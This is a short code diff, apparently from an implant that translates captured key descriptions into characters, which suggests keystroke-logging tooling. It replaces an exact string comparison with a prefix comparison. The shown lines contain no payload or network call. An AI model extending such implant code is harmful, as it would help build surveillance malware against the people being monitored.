@@ -58,7 +58,7 @@ get_highest_fd(implant_t *instance) {
 static char *
 check_translated_key(char *key_desc) {
     for (size_t ctr = 0; KEYS[ctr].description != NULL; ctr++) {
-        if (!strcmp(KEYS[ctr].description, key_desc)) {
+        if (!strncmp(KEYS[ctr].description, key_desc, strlen(KEYS[ctr].description))) {
 
             memset(key_desc, 0, STRING_BUFFER_SIZE);
             key_desc[0] = KEYS[ctr].representation;
